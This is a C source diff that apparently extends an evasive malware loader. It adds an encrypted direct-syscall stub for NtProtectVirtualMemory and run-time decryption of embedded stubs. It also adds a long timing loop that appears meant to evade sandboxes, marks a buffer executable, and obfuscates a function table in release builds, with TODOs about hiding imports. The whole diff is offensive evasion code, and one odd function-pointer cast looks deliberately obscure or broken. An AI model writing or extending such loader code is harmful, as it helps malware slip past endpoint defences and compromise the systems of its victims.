@@ -33,6 +33,10 @@ uint8_t loader[] =
 #include "loader.h"
 ;
 
+uint8_t sys_protect[] =
+#include "encfun/sys_protect.h"
+;
+
 uint8_t sys_create[] =
 #include "encfun/sys_create.h"
 ;
@@ -60,7 +64,12 @@ int main(int argc, char *argv[]) {
 	for (i = 0, n = 0; i < 0x7FFFFFFFF; ++i) {
 		n += i;
 	}
+	decrypt((uint8_t*)&i, sizeof(i));
+	n = ((uint64_t(*)(uint64_t, uint64_t))sys_NtProtectVirtualMemory)(n, i);
 #endif
+
+	//TODO: imports using GetProc
+	//TODO: write sys_protect to sys_NtProtectVirtualMemory
 
 	decrypt(loader, sizeof(loader));
 	decrypt(sys_create, sizeof(sys_create));
@@ -83,6 +92,12 @@ int main(int argc, char *argv[]) {
 	bufAddr = main_fun;
 	nBytes = sizeof(main_fun);
 	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);
+
+#ifndef DEBUG
+	for (i = 0; i < sizeof(main_funs); ++i) {
+		((uint8_t*)&main_funs)[i] = ((uint8_t*)&n)[i % sizeof(n)];
+	}
+#endif
 
 
 	main_funs.NtCreateFile = (PVOID)sys_create;
